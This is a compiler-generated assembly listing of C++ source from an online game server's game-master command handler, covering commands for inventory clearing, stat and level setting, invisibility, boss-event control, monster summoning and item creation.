; 3663 : 			{
; 3664 : 				break;
; 3665 : 			}
; 3666 : #else
; 3667 : 			if( g_CashLotterySystem.GetItem( &LotteryItem ) == -1 )
; 3668 : 			{
; 3669 : 				break;
; 3670 : 			}
; 3671 : #endif // MODIFY_EXPEND_CHAOSCARD_SYSTEM_20080326
; 3672 : 			ItemSerialCreateSend( lpObj->m_Index, lpObj->MapNumber, lpObj->X, lpObj->Y,
; 3673 : 				LotteryItem.m_Type,
; 3674 : 				LotteryItem.m_Level,
; 3675 : 				LotteryItem.m_Durability,
; 3676 : 				LotteryItem.m_Option1,
; 3677 : 				LotteryItem.m_Option2,
; 3678 : 				LotteryItem.m_Option3,
; 3679 : 				lpObj->m_Index,
; 3680 : 				LotteryItem.m_NewOption, 0 );
; 3681 : 		}
; 3682 : 		break;
; 3683 : #endif // ADD_PCS_LOTTERY_SYSTEM_20070117
; 3684 : 
; 3685 : #endif
; 3686 : 
; 3687 : #ifdef MODIFY_INVEN_CLEAR_MACRO_20071212
; 3688 : 	case GMCMD_INVENTORY_ITEM_DELETE:
; 3689 : 		{
; 3690 : 			int iInvenPosX = GetTokenNumber();

  02ee4	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02ee7	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02eec	89 85 c0 f3 ff
	ff		 mov	 DWORD PTR _iInvenPosX$43[ebp], eax

; 3691 : 			int iInvenPosY = GetTokenNumber();

  02ef2	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02ef5	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02efa	89 85 bc f3 ff
	ff		 mov	 DWORD PTR _iInvenPosY$42[ebp], eax

; 3692 : 			// 
; 3693 : 			int pos = (iInvenPosY-1)*8 + (iInvenPosX-1) + EQUIPMENT_GOLD;

  02f00	8b 85 bc f3 ff
	ff		 mov	 eax, DWORD PTR _iInvenPosY$42[ebp]
  02f06	8b 8d c0 f3 ff
	ff		 mov	 ecx, DWORD PTR _iInvenPosX$43[ebp]
  02f0c	8d 54 c1 03	 lea	 edx, DWORD PTR [ecx+eax*8+3]
  02f10	89 95 b8 f3 ff
	ff		 mov	 DWORD PTR _pos$41[ebp], edx

; 3694 : 
; 3695 : 			gObjInventoryDeleteItem( lpObj->m_Index, pos );

  02f16	8b 85 b8 f3 ff
	ff		 mov	 eax, DWORD PTR _pos$41[ebp]
  02f1c	50		 push	 eax
  02f1d	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02f20	8b 11		 mov	 edx, DWORD PTR [ecx]
  02f22	52		 push	 edx
  02f23	e8 00 00 00 00	 call	 ?gObjInventoryDeleteItem@@YAEHH@Z ; gObjInventoryDeleteItem
  02f28	83 c4 08	 add	 esp, 8

; 3696 : 			GCItemListSend( lpObj->m_Index );

  02f2b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02f2e	8b 08		 mov	 ecx, DWORD PTR [eax]
  02f30	51		 push	 ecx
  02f31	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  02f36	83 c4 04	 add	 esp, 4

; 3697 : 		}
; 3698 : 		break;

  02f39	e9 7e 0d 00 00	 jmp	 $LN2@Management
$LN251@Management:

; 3699 : 	case GMCMD_INVENTORY_ITEM_ALL_DELETE:
; 3700 : 		{
; 3701 : #ifdef GMCOMMAND_EX_1ST_BUGFIX
; 3702 : 			for( int i = MAX_EQUIPMENT ; i < MAX_INVENTORY ; i++ )
; 3703 : #else
; 3704 : 			for( int i = MAX_EQUIPMENT ; i < MAX_INVENTORY - 1 ; i++ )

  02f3e	c7 85 b4 f3 ff
	ff 0c 00 00 00	 mov	 DWORD PTR _i$40[ebp], 12 ; 0000000cH
  02f48	eb 0f		 jmp	 SHORT $LN51@Management
$LN49@Management:
  02f4a	8b 85 b4 f3 ff
	ff		 mov	 eax, DWORD PTR _i$40[ebp]
  02f50	83 c0 01	 add	 eax, 1
  02f53	89 85 b4 f3 ff
	ff		 mov	 DWORD PTR _i$40[ebp], eax
$LN51@Management:
  02f59	83 bd b4 f3 ff
	ff 4b		 cmp	 DWORD PTR _i$40[ebp], 75 ; 0000004bH
  02f60	7d 34		 jge	 SHORT $LN50@Management

; 3705 : #endif // GMCOMMAND_EX_1ST_BUGFIX
; 3706 : 			{
; 3707 : 				if( lpObj->pInventory[i].IsItem() == TRUE )

  02f62	69 8d b4 f3 ff
	ff a8 00 00 00	 imul	 ecx, DWORD PTR _i$40[ebp], 168
  02f6c	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02f6f	03 88 5c 0c 00
	00		 add	 ecx, DWORD PTR [eax+3164]
  02f75	e8 00 00 00 00	 call	 ?IsItem@CItem@@QAEHXZ	; CItem::IsItem
  02f7a	83 f8 01	 cmp	 eax, 1
  02f7d	75 15		 jne	 SHORT $LN252@Management

; 3708 : 				{
; 3709 : 					gObjInventoryDeleteItem( lpObj->m_Index, i );

  02f7f	8b 85 b4 f3 ff
	ff		 mov	 eax, DWORD PTR _i$40[ebp]
  02f85	50		 push	 eax
  02f86	8b 4d 08	 mov	 ecx, DWORD PTR _lpObj$[ebp]
  02f89	8b 11		 mov	 edx, DWORD PTR [ecx]
  02f8b	52		 push	 edx
  02f8c	e8 00 00 00 00	 call	 ?gObjInventoryDeleteItem@@YAEHH@Z ; gObjInventoryDeleteItem
  02f91	83 c4 08	 add	 esp, 8
$LN252@Management:

; 3710 : 				}
; 3711 : 			}

  02f94	eb b4		 jmp	 SHORT $LN49@Management
$LN50@Management:

; 3712 : 
; 3713 : 			GCItemListSend( lpObj->m_Index );

  02f96	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02f99	8b 08		 mov	 ecx, DWORD PTR [eax]
  02f9b	51		 push	 ecx
  02f9c	e8 00 00 00 00	 call	 ?GCItemListSend@@YAXH@Z	; GCItemListSend
  02fa1	83 c4 04	 add	 esp, 4

; 3714 : 		}
; 3715 : 		break;

  02fa4	e9 13 0d 00 00	 jmp	 $LN2@Management

; 3716 : 	case GMCMD_DEVILSQUARE_SET_TIME:
; 3717 : //		int iTime;
; 3718 : //
; 3719 : //		iTime = GetTokenNumber();
; 3720 : //
; 3721 : //		#if TESTSERVER == 1
; 3722 : //		g_DevilSquare.SetRemainTime( iTime );
; 3723 : //		#endif
; 3724 : 		break;

  02fa9	e9 0e 0d 00 00	 jmp	 $LN2@Management
$LN254@Management:

; 3725 : #endif // MODIFY_INVEN_CLEAR_MACRO_20071212
; 3726 : 
; 3727 : 
; 3728 : 
; 3729 : #if (TESTSERVER == 0)
; 3730 : 	#ifdef ADD_MACRO_FOR_SETITEM_20060424
; 3731 : 	case GMCMD_STATRESET :
; 3732 : 		{	//  
; 3733 : 			int Class = lpObj->Class;
; 3734 : 
; 3735 : 			lpObj->ChangeUP = 0;
; 3736 : 			//lpObj->Experience = 0;
; 3737 : 
; 3738 : 			lpObj->Strength = DCInfo.DefClass[Class].Strength;
; 3739 : 			lpObj->Dexterity = DCInfo.DefClass[Class].Dexterity;
; 3740 : 			lpObj->Vitality = DCInfo.DefClass[Class].Vitality;
; 3741 : 			lpObj->Energy = DCInfo.DefClass[Class].Energy;
; 3742 : 			lpObj->Life = DCInfo.DefClass[Class].Life;
; 3743 : 			lpObj->MaxLife = DCInfo.DefClass[Class].MaxLife;
; 3744 : 			
; 3745 : 			lpObj->Mana = DCInfo.DefClass[Class].Mana;
; 3746 : 			lpObj->MaxMana = DCInfo.DefClass[Class].MaxMana;
; 3747 : 
; 3748 : #ifdef DARKLORD_WORK
; 3749 : 			lpObj->Leadership = DCInfo.DefClass[Class].Leadership;
; 3750 : #endif
; 3751 : 
; 3752 : #ifdef DARKLORD_WORK
; 3753 : 			if (lpObj->Class == CLASS_DARKLORD||lpObj->Class == CLASS_MAGUMSA) 
; 3754 : #else			
; 3755 : 			if( lpObj->Class == CLASS_MAGUMSA )
; 3756 : #endif
; 3757 : 				lpObj->LevelUpPoint = (lpObj->Level-1)*7;
; 3758 : 			else
; 3759 : 				lpObj->LevelUpPoint = (lpObj->Level-1)*5;
; 3760 : 			
; 3761 : 
; 3762 : 			GCServerMsgStringSend("  .   ", lpObj->m_Index, 1);
; 3763 : 			gObjCloseSet(lpObj->m_Index, CL_BACK);			
; 3764 : 		}
; 3765 : 		break;
; 3766 : 	case GMCMD_SETLEVEL:
; 3767 : 		{
; 3768 : 			int Class = lpObj->Class;
; 3769 : 
; 3770 : 			int level= GetTokenNumber();
; 3771 : 
; 3772 : 			if( level < 1 )
; 3773 : 				level = 1;
; 3774 : 
; 3775 : 			lpObj->Level = level;
; 3776 : 
; 3777 : 			lpObj->Experience = gLevelExperience[lpObj->Level-1];
; 3778 : 
; 3779 : 	#ifdef ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 3780 : 			lpObj->iFruitPoint = 0;
; 3781 : 	#endif // ADD_MINUS_STAT_SYSTEM_USING_FRUIT_20050712
; 3782 : 			//    
; 3783 : 			ManagementProc(lpObj, "/", aIndex);
; 3784 : 		}
; 3785 : 		break;
; 3786 : 	#endif // ADD_MACRO_FOR_SETITEM_20060424
; 3787 : #endif
; 3788 : 
; 3789 : #ifdef UPDATE_GM_FUNCTION_20070228	// ,  
; 3790 : 	case GMCMD_INVISIBLE:
; 3791 : 		{
; 3792 : #if TESTSERVER == 0
; 3793 : 			if( (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM )
; 3794 : 				return 0;
; 3795 : #endif // TESTSERVER
; 3796 : 
; 3797 : 	#ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
; 3798 : 			gObjAddBuffEffect( lpObj, BUFFTYPE_INVISABLE, 0, 0, 0, 0, BUFFTIME_INFINITE );
; 3799 : 	#else
; 3800 : 			lpObj->m_iSkillInvisibleTime = 0;	// 0    	
; 3801 : 
; 3802 : 			ADD_VIEWSKILLSTATE( lpObj->m_ViewSkillState, STATE_CLOAKING );
; 3803 : 			GCStateInfoSend(lpObj, 1, STATE_CLOAKING);
; 3804 : 	#endif // MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
; 3805 : 			gObjViewportListProtocolDestroy(lpObj);
; 3806 : 		}
; 3807 : 		break;
; 3808 : 	case GMCMD_REMOVE_INVISIBLE:
; 3809 : 		{
; 3810 : 			if( (lpObj->Authority&AUTHORITY_EVENT_GM) != AUTHORITY_EVENT_GM )
; 3811 : 				return 0;
; 3812 : 			
; 3813 : #ifdef MODIFY_OLD_BUFF_EFFECT_SYSTEM_20071004
; 3814 : 			gObjRemoveBuffEffect( lpObj, BUFFTYPE_INVISABLE );
; 3815 : #else
; 3816 : 			DEL_VIEWSKILLSTATE( lpObj->m_ViewSkillState, STATE_CLOAKING );
; 3817 : 			GCStateInfoSend(lpObj, 0, STATE_CLOAKING );
; 3818 : #endif // GCStateInfoSend(lpObj, 1, STATE_CLOAKING);
; 3819 : 			gObjViewportListProtocolCreate(lpObj);
; 3820 : 		}
; 3821 : 		break;			
; 3822 : #endif
; 3823 : 
; 3824 : #ifdef ADD_RAKLION_20080408
; 3825 : 	case GMCMD_RAKLION_IDLE:
; 3826 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_IDLE );
; 3827 : 		break;
; 3828 : 	case GMCMD_RAKLION_NOTIFY_1:
; 3829 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_NOTIFY_1 );
; 3830 : 		break;
; 3831 : 	case GMCMD_RAKLION_STANDBY:
; 3832 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_STANDBY );
; 3833 : 		break;
; 3834 : 	case GMCMD_RAKLION_NOTIFY_2:
; 3835 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_NOTIFY_2 );
; 3836 : 		break;
; 3837 : 	case GMCMD_RAKLION_READY:
; 3838 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_READY );
; 3839 : 		break;
; 3840 : 	case GMCMD_RAKLION_START_BATTLE:
; 3841 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_START_BATTLE );
; 3842 : 		break;
; 3843 : 	case GMCMD_RAKLION_NOTIFY_3:
; 3844 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_NOTIFY_3 );
; 3845 : 		break;
; 3846 : 	case GMCMD_RAKLION_CLOSE_DOOR:
; 3847 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_CLOSE_DOOR );
; 3848 : 		break;
; 3849 : 	case GMCMD_RAKLION_ALL_USER_DIE:
; 3850 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_ALL_USER_DIE );
; 3851 : 		break;
; 3852 : 	case GMCMD_RAKLION_NOTIFY_4:
; 3853 : 	//	g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_NOTIFY_4 );
; 3854 : 		break;
; 3855 : 	case GMCMD_RAKLION_END:
; 3856 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_END );
; 3857 : 		break;
; 3858 : 	case GMCMD_RAKLION_SELUPAN_1:
; 3859 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_1 );
; 3860 : 		break;
; 3861 : 	case GMCMD_RAKLION_SELUPAN_2:
; 3862 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_2 );
; 3863 : 		break;
; 3864 : 	case GMCMD_RAKLION_SELUPAN_3:
; 3865 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_3 );
; 3866 : 		break;
; 3867 : 	case GMCMD_RAKLION_SELUPAN_4:
; 3868 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_4 );
; 3869 : 		break;
; 3870 : 	case GMCMD_RAKLION_SELUPAN_5:
; 3871 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_5 );
; 3872 : 		break;
; 3873 : 	case GMCMD_RAKLION_SELUPAN_6:
; 3874 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_6 );
; 3875 : 		break;
; 3876 : 	case GMCMD_RAKLION_SELUPAN_7:
; 3877 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SELUPAN_7 );
; 3878 : 		break;
; 3879 : 	case GMCMD_RAKLION_FIRST_SKILL:
; 3880 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_FIRST_SKILL );
; 3881 : 		break;
; 3882 : 	case GMCMD_RAKLION_POISON_ATTACK:
; 3883 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_POISON_ATTACK );
; 3884 : 		break;
; 3885 : 	case GMCMD_RAKLION_ICE_STORM:
; 3886 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_ICE_STORM );
; 3887 : 		break;
; 3888 : 	case GMCMD_RAKLION_ICE_STRIKE:
; 3889 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_ICE_STRIKE );
; 3890 : 		break;
; 3891 : 	case GMCMD_RAKLION_SUMMON_MONSTER:
; 3892 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_SUMMON_MONSTER );
; 3893 : 		break;
; 3894 : 	case GMCMD_RAKLION_HEAL:
; 3895 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_HEAL );
; 3896 : 		break;
; 3897 : 	case GMCMD_RAKLION_FREEZE:
; 3898 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_FREEZE );
; 3899 : 		break;
; 3900 : 	case GMCMD_RAKLION_TELEPORT_RANDOM:
; 3901 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_TELEPORT_RANDOM );
; 3902 : 		break;
; 3903 : 	case GMCMD_RAKLION_INVINCIBILITY:
; 3904 : 		g_Raklion.OperateGmCommand( lpObj->m_Index, RAKLION_GM_COMMAND_INVINCIBILITY );
; 3905 : 		break;
; 3906 : #endif // ADD_RAKLION_20080408
; 3907 : 
; 3908 : #ifdef GMCOMMAND_EX
; 3909 : 	case GMCMD_GETABILITY:
; 3910 : 		_GetUserAbility(lpObj, GetTokenString());

  02fae	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02fb1	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  02fb6	50		 push	 eax
  02fb7	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02fba	50		 push	 eax
  02fbb	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02fbe	e8 00 00 00 00	 call	 ?_GetUserAbility@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_GetUserAbility

; 3911 : 		break;

  02fc3	e9 f4 0c 00 00	 jmp	 $LN2@Management
$LN255@Management:

; 3912 : 
; 3913 : 	case GMCMD_PARTYINFO:
; 3914 : 		_GetPartyInfo(lpObj, GetTokenString());

  02fc8	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02fcb	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  02fd0	50		 push	 eax
  02fd1	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  02fd4	50		 push	 eax
  02fd5	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02fd8	e8 00 00 00 00	 call	 ?_GetPartyInfo@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_GetPartyInfo

; 3915 : 		break;

  02fdd	e9 da 0c 00 00	 jmp	 $LN2@Management
$LN256@Management:

; 3916 : 
; 3917 : 	case GMCMD_SUMMONMONSTER:
; 3918 : 		{
; 3919 : 			LPSTR lpszName = GetTokenString();

  02fe2	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02fe5	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  02fea	89 85 b0 f3 ff
	ff		 mov	 DWORD PTR _lpszName$39[ebp], eax

; 3920 : 			int nCount = GetTokenNumber();

  02ff0	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  02ff3	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  02ff8	89 85 ac f3 ff
	ff		 mov	 DWORD PTR _nCount$38[ebp], eax

; 3921 : 			_SummonMonster(lpObj, lpszName, nCount);

  02ffe	8b 85 ac f3 ff
	ff		 mov	 eax, DWORD PTR _nCount$38[ebp]
  03004	50		 push	 eax
  03005	8b 8d b0 f3 ff
	ff		 mov	 ecx, DWORD PTR _lpszName$39[ebp]
  0300b	51		 push	 ecx
  0300c	8b 55 08	 mov	 edx, DWORD PTR _lpObj$[ebp]
  0300f	52		 push	 edx
  03010	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03013	e8 00 00 00 00	 call	 ?_SummonMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBDH@Z ; CGMMng::_SummonMonster

; 3922 : 		}
; 3923 : 		break;

  03018	e9 9f 0c 00 00	 jmp	 $LN2@Management
$LN257@Management:

; 3924 : 
; 3925 : 	case GMCMD_CLEARMONSTER:
; 3926 : 		_ClearMonster(lpObj, GetTokenNumber());

  0301d	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03020	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  03025	50		 push	 eax
  03026	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03029	50		 push	 eax
  0302a	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0302d	e8 00 00 00 00	 call	 ?_ClearMonster@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z ; CGMMng::_ClearMonster

; 3927 : 		break;

  03032	e9 85 0c 00 00	 jmp	 $LN2@Management
$LN258@Management:

; 3928 : 
; 3929 : 	case GMCMD_CLEARITEM:
; 3930 : 		_ClearItem(lpObj, GetTokenNumber());

  03037	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  0303a	e8 00 00 00 00	 call	 ?GetTokenNumber@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumber
  0303f	50		 push	 eax
  03040	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03043	50		 push	 eax
  03044	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03047	e8 00 00 00 00	 call	 ?_ClearItem@CGMMng@@AAEXPAVOBJECTSTRUCT@@H@Z ; CGMMng::_ClearItem

; 3931 : 		break;

  0304c	e9 6b 0c 00 00	 jmp	 $LN2@Management
$LN259@Management:

; 3932 : 
; 3933 : 	case GMCMD_CLEARINVEN:
; 3934 : 		_ClearInven(lpObj);

  03051	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  03054	50		 push	 eax
  03055	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03058	e8 00 00 00 00	 call	 ?_ClearInven@CGMMng@@AAEXPAVOBJECTSTRUCT@@@Z ; CGMMng::_ClearInven

; 3935 : 		break;

  0305d	e9 5a 0c 00 00	 jmp	 $LN2@Management
$LN260@Management:

; 3936 : 
; 3937 : 	case GMCMD_SUMMONCHARACTER:
; 3938 : 		_SummonCharacter(lpObj, GetTokenString());

  03062	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03065	e8 00 00 00 00	 call	 ?GetTokenString@CGMMng@@QAEPADXZ ; CGMMng::GetTokenString
  0306a	50		 push	 eax
  0306b	8b 45 08	 mov	 eax, DWORD PTR _lpObj$[ebp]
  0306e	50		 push	 eax
  0306f	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  03072	e8 00 00 00 00	 call	 ?_SummonCharacter@CGMMng@@AAEXPAVOBJECTSTRUCT@@PBD@Z ; CGMMng::_SummonCharacter

; 3939 : 		break;

  03077	e9 40 0c 00 00	 jmp	 $LN2@Management
$LN261@Management:

; 3940 : #endif // GMCOMMAND_EX
; 3941 : 
; 3942 : #ifdef ADD_NEWPVP_PKFIELD
; 3943 : 	case GMCMD_NEWPVP_OBSERVER:
; 3944 : 		{
; 3945 : 			if (g_NewPVP.IsObserver(*lpObj) == FALSE)
; 3946 : 			{
; 3947 : 				g_NewPVP.SetBuff(*lpObj, TRUE);
; 3948 : 				GCServerMsgStringSend("-ON", lpObj->m_Index, 1);
; 3949 : 			} 
; 3950 : 			else 
; 3951 : 			{
; 3952 : 				g_NewPVP.SetBuff(*lpObj, FALSE);
; 3953 : 				GCServerMsgStringSend("-OFF", lpObj->m_Index, 1);
; 3954 : 			}
; 3955 : 		}
; 3956 : 		break;
; 3957 : 		
; 3958 : 	case GMCMD_NEWPVP_GLORYOFGLADIATOR:
; 3959 : 		{
; 3960 : 			if (gObjCheckUsedBuffEffect(lpObj, BUFFTYPE_GLORYOFGLADIATOR))
; 3961 : 			{
; 3962 : 				gObjRemoveBuffEffect(lpObj, BUFFTYPE_GLORYOFGLADIATOR);
; 3963 : 				GCServerMsgStringSend("-OFF", lpObj->m_Index, 1);
; 3964 : 			}
; 3965 : 			else
; 3966 : 			{
; 3967 : 				gObjAddBuffEffect(lpObj, BUFFTYPE_GLORYOFGLADIATOR);
; 3968 : 				GCServerMsgStringSend("-ON", lpObj->m_Index, 1);
; 3969 : 			}
; 3970 : 		}
; 3971 : 		break;
; 3972 : #endif // ADD_NEWPVP_PKFIELD
; 3973 : 
; 3974 : #ifdef PCBANG_POINT_SYSTEM_20070206
; 3975 : 	case GMCMD_ADD_PCBANG_POINT:
; 3976 : 		{
; 3977 : 			int iAddPCBangPoint = GetTokenNumber();
; 3978 : 			lpObj->m_PCBangPointInfo.dwCheckRuleTime = GetTickCount();
; 3979 : 			lpObj->m_PCBangPointInfo.nPCBangPoint += iAddPCBangPoint;
; 3980 : 			{
; 3981 : 				//   .
; 3982 : 				char szTemp[256];			
; 3983 : 				wsprintf( szTemp, lMsg.Get( 3392 ), iAddPCBangPoint );
; 3984 : 				GCServerMsgStringSend( szTemp, lpObj->m_Index, 1 );		// " %d "
; 3985 : 			}
; 3986 : 			
; 3987 : 			// EventServer    .
; 3988 : 			g_PCBangPointSystem.GEReqUpdatePCBangPoint2( lpObj->m_Index );
; 3989 : 			
; 3990 : 			LogAddTD( "[PCBangPointSystem][Add Point] [%s] %d/Total:%d Rule(%d)", 
; 3991 : 				lpObj->AccountID,
; 3992 : 				lpObj->m_PCBangPointInfo.nCurrentAppRulePoint,
; 3993 : 				lpObj->m_PCBangPointInfo.nPCBangPoint,
; 3994 : 				lpObj->m_PCBangPointInfo.btCurrentRule );
; 3995 : 		}
; 3996 : 		break;
; 3997 : 		
; 3998 : 	case GMCMD_RESET_PCBANG_POINT:
; 3999 : 		{
; 4000 : 			int iAddPCBangPoint = 0;
; 4001 : 			lpObj->m_PCBangPointInfo.dwCheckRuleTime = GetTickCount();
; 4002 : 			lpObj->m_PCBangPointInfo.nPCBangPoint = iAddPCBangPoint;
; 4003 : 			{
; 4004 : 				//   .
; 4005 : 				char szTemp[256];			
; 4006 : 				wsprintf( szTemp, lMsg.Get( 3392 ), iAddPCBangPoint );
; 4007 : 				GCServerMsgStringSend( szTemp, lpObj->m_Index, 1 );		// " %d "
; 4008 : 			}
; 4009 : 			
; 4010 : 			// EventServer    .
; 4011 : 			g_PCBangPointSystem.GEReqUpdatePCBangPoint2( lpObj->m_Index );
; 4012 : 			
; 4013 : 			LogAddTD( "[PCBangPointSystem][Add Point] [%s] %d/Total:%d Rule(%d)", 
; 4014 : 				lpObj->AccountID,
; 4015 : 				lpObj->m_PCBangPointInfo.nCurrentAppRulePoint,
; 4016 : 				lpObj->m_PCBangPointInfo.nPCBangPoint,
; 4017 : 				lpObj->m_PCBangPointInfo.btCurrentRule );
; 4018 : 		}
; 4019 : 		break;
; 4020 : #endif // PCBANG_POINT_SYSTEM_20070206
; 4021 : 
; 4022 : 	case GMCMD_ITEMCREATE:
; 4023 : 		{
; 4024 : 			if(g_GlobalConfig.m_bDisableMake == TRUE) break;

  0307c	83 3d 0c 00 00
	00 01		 cmp	 DWORD PTR ?g_GlobalConfig@@3VCGlobalConfig@@A+12, 1
  03083	75 05		 jne	 SHORT $LN262@Management
  03085	e9 32 0c 00 00	 jmp	 $LN2@Management
$LN262@Management:

; 4025 : 
; 4026 : 			int type, index, level, skill=0, luck=0, op3=0, exoption = 0;

  0308a	c7 85 9c f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _skill$34[ebp], 0
  03094	c7 85 98 f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _luck$33[ebp], 0
  0309e	c7 85 94 f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _op3$32[ebp], 0
  030a8	c7 85 90 f3 ff
	ff 00 00 00 00	 mov	 DWORD PTR _exoption$31[ebp], 0

; 4027 : 			BYTE NewOption=0;

  030b2	c6 85 8f f3 ff
	ff 00		 mov	 BYTE PTR _NewOption$30[ebp], 0

; 4028 : 			int  dur=255;

  030b9	c7 85 88 f3 ff
	ff ff 00 00 00	 mov	 DWORD PTR _dur$29[ebp], 255 ; 000000ffH

; 4029 : 
; 4030 : 			type = GetTokenNumberEx();

  030c3	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  030c6	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  030cb	89 85 a8 f3 ff
	ff		 mov	 DWORD PTR _type$37[ebp], eax

; 4031 : 			index = GetTokenNumberEx();

  030d1	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  030d4	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  030d9	89 85 a4 f3 ff
	ff		 mov	 DWORD PTR _index$36[ebp], eax

; 4032 : 
; 4033 : 			level = GetTokenNumberEx();

  030df	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  030e2	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  030e7	89 85 a0 f3 ff
	ff		 mov	 DWORD PTR _level$35[ebp], eax

; 4034 : 
; 4035 : 			skill = GetTokenNumberEx();

  030ed	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  030f0	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  030f5	89 85 9c f3 ff
	ff		 mov	 DWORD PTR _skill$34[ebp], eax

; 4036 : 			luck = GetTokenNumberEx();

  030fb	8b 4d ec	 mov	 ecx, DWORD PTR _this$[ebp]
  030fe	e8 00 00 00 00	 call	 ?GetTokenNumberEx@CGMMng@@QAEHXZ ; CGMMng::GetTokenNumberEx
  03103	89 85 98 f3 ff
	ff		 mov	 DWORD PTR _luck$33[ebp], eax

